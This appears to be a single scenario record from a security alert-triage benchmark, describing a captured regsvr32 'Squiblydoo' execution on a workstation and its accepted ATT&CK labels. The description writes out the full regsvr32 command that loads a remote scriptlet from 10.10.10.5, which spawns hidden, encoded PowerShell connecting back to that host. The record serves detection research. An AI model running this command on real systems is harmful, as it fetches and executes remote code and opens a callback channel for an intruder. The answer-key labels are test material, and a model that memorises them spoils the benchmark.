scenarios.name: regsvr32_remote_scriptlet
scenarios.description: Real capture: regsvr32.exe /i:http://10.10.10.5:8444/launcher.sct scrobj.dll loads a remote scriptlet, which starts a hidden, encoded PowerShell that connects back to 10.10.10.5:80.
scenarios.alert: Alert on WORKSTATION5.mordor.local: process regsvr32.exe. Review this process and its related activity.
scenarios.label_note: Accepted: the scriptlet starts PowerShell (T1059.001) with a base64 -enc command (T1027, T1140) in a hidden window (T1564.003), fetched from and talking to a web server (T1105, T1071.001).
